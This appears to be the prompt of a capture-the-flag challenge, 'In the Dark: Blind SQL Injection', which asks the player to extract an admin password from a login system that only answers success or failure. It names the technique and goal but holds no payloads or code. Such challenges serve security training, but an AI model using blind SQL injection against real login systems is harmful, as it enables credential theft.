“In the Dark: Blind SQL Injection”

A login system has been deployed in a hurry.
It gives almost no errors, no warnings, and no visible database output.

Everything looks normal.
Too normal.

But behind the scenes, the database is listening.

Your mission:
Extract the admin password without ever seeing the database response directly.

You will not be shown the data.
You must infer it.

Welcome to the dark side of SQL Injection.

Hint: The system only answers one thing:
Success or Failure

Can you ask the right questions????
